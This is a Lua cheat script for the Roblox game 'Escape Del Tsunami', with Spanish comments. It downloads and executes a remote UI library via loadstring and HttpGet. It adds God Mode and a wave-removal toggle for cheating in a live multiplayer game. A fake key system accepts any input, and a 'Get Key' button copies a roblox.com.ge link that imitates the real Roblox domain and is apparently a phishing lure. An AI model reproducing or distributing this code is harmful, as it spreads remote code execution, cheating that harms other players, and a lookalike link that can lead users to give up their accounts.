local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()

local KeyVerified = false

-- Crear ventana principal
local Window = Rayfield:CreateWindow({
    Name = "Escape Del Tsunami",
    LoadingTitle = "Cargando...",
    LoadingSubtitle = "by technoourielcompany",
    ConfigurationSaving = { Enabled = false },
    Discord = { Enabled = false },
    KeySystem = false
})

-- Tab de Key
local KeyTab = Window:CreateTab("Key", 4483362458)

-- Caja de texto (sin placeholder de clave específica)
local KeyBox = KeyTab:CreateInput({
    Name = "Introduce tu Key",
    PlaceholderText = "Escribe tu clave aquí...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        -- Acepta cualquier texto no vacío (puedes cambiar la condición si quieres una clave fija)
        if text \~= "" then
            KeyVerified = true
            Rayfield:Notify({
                Title = "✅ Correcto",
                Content = "Clave aceptada - ¡A jugar!",
                Duration = 4
            })
            CreateHackerMenu()
        else
            Rayfield:Notify({
                Title = "❌ Error",
                Content = "Introduce una clave",
                Duration = 3
            })
        end
    end,
})

-- Botón Get Key: copia el link de la comunidad que tenías
local GetKeyButton = KeyTab:CreateButton({
    Name = "📋 Get Key",
    Callback = function()
        local link = "https://roblox.com.ge/communities/4362678772/"
        setclipboard(link)
        Rayfield:Notify({
            Title = "📋 Copiado",
            Content = "Link de la comunidad copiado al portapapeles. Pégalo en tu navegador.",
            Duration = 5
        })
    end,
})

-- Función para crear el menú principal (agrega aquí tus funciones favoritas)
function CreateHackerMenu()
    local MainTab = Window:CreateTab("🌊 Principal", 4483362458)

    MainTab:CreateSection("Funciones Básicas")

    -- Ejemplo: God Mode
    MainTab:CreateToggle({
        Name = "God Mode (Inmortal)",
        CurrentValue = false,
        Callback = function(Value)
            if Value then
                spawn(function()
                    while Value do
                        local char = game.Players.LocalPlayer.Character
                        if char and char:FindFirstChild("Humanoid") then
                            char.Humanoid.Health = math.huge
                            char.Humanoid.MaxHealth = math.huge
                        end
                        task.wait(0.5)
                    end
                end)
            end
        end,
    })

    -- Ejemplo: Freeze Tsunami
    MainTab:CreateToggle({
        Name = "Freeze Tsunami / Remove Wave",
        CurrentValue = false,
        Callback = function(Value)
            if Value then
                spawn(function()
                    while Value do
                        for _, part in pairs(workspace:GetDescendants()) do
                            local n = part.Name:lower()
                            if n:find("wave") or n:find("tsunami") or n:find("water") then
                                if part:IsA("BasePart") then
                                    part.Transparency = 1
                                    part.CanCollide = false
                                    part.Velocity = Vector3.new(0,0,0)
                                end
                            end
                        end
                        task.wait(1.5)
                    end
                end)
            end
        end,
    })

    -- Agrega aquí más toggles, botones, sliders, etc. que quieras
    -- Por ejemplo: Auto Farm, ESP, Teleports, Spawner...

    Rayfield:Notify({
        Title = "¡Menú cargado!",
        Content = "Disfruta las funciones 🌊",
        Duration = 4
    })
end

